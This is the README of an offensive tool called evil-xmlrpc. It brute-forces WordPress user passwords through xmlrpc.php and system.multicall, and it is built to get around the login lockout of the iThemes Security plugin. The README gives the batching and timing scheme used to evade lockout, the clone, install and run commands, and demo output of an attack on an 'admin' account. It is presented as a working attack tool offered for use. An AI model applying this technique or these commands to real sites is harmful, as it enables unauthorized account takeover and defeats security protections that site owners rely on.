# evil-xmlrpc
evil-xmlrpc is a tool that I created to help me bruteforce wordpress user accounts using xmlrpc.php while bypassing iThemes Security preventing lockouts

While testing a specific target I noticed that xmlrpc was enabled, but after sending 5 requests against a discovered user account, I was locked out of the site. After waiting till the lockout period ended I saw that iThemes Security Plugin was being used on the site. I soon noticed that I was locked out after sending 4 requests. Regular bruteforce methods weren't going to work here. Later I discovered that you could send many login attempt via 1 single request using "system.multicall". In my particular situation I could only send 1666 login attempts in a single request (may be different for your target). So I made this script to be able to take a password list (of about 1 million words) and send it off in groups of 1664 (Initially was 1666 in the script, but cut it back by 2 for breathing room). 

For example: 
* Request 1 (Sends lines 1-1666 of wordlist) 
* Request 2 (Sends lines 1667-3332 of wordlist)
* Request 3 (Sends lines 3333-4998 of wordlist)
* Request 4 (Sends lines 4999-6664 of wordlist)

Before sending the 5th request in order to prevent being locked out of the site, stop for 5 mins and then continue going down the list.

## Install 

```sh
git clone https://github.com/0xApt/evil-xmlrpc.git
cd evil-xmlrpc
pip3 install -r requirements.txt
python3 evil-xmlrpc.py <passwordlist> <username> <https://www.examplesite.com>
```

## Demo output

```sh

root@user:~ python3 evil-xmlrpc.py 100000-pass-wordlist.txt admin https://www.examplesite.com                                                                                                                      

                 ██  ▀██                        ▀██
  ▄▄▄▄  ▄▄▄▄ ▄▄▄ ▄▄▄   ██     ▄▄▄ ▄▄▄ ▄▄ ▄▄ ▄▄    ██  ▄▄▄ ▄▄  ▄▄▄ ▄▄▄    ▄▄▄▄
▄█▄▄▄██  ▀█▄  █   ██   ██      ▀█▄▄▀   ██ ██ ██   ██   ██▀ ▀▀  ██▀  ██ ▄█   ▀▀
██        ▀█▄█    ██   ██       ▄█▄    ██ ██ ██   ██   ██      ██    █ ██
 ▀█▄▄▄▀    ▀█    ▄██▄ ▄██▄    ▄█  ██▄ ▄██ ██ ██▄ ▄██▄ ▄██▄     ██▄▄▄▀   ▀█▄▄▄▀
                                                               ██
                                                              ▀▀▀▀
                                By 0xapt

[*] Checking if site is vulnerable..
[*] Site is vulnerable!
[*] File has 100000 lines

[*] Sending Payload.. 
[*] Attempt: 1 
[*] Target User: admin
[*] Using lines 0 to 1664 from password list
[*] Content Length: 356283
[*] Interesting.. Saving response..
[*] Password Not Cracked.

[*] Sending Payload.. 
[*] Attempt: 2 
[*] Target User: admin
[*] Using lines 1665 to 3328 from password list
[*] Content Length: 356069
[*] Password Not Cracked.

[*] Sending Payload.. 
[*] Attempt: 3 
[*] Target User: admin
[*] Using lines 3329 to 4992 from password list
[*] Content Length: 356069
[*] Password Not Cracked.

[*] Sending Payload.. 
[*] Attempt: 4 
[*] Target User: admin
[*] Using lines 4993 to 6656 from password list
[*] Content Length: 356069
[*] Password Not Cracked.

[*] Waiting 5 mins to prevent lockout...
```
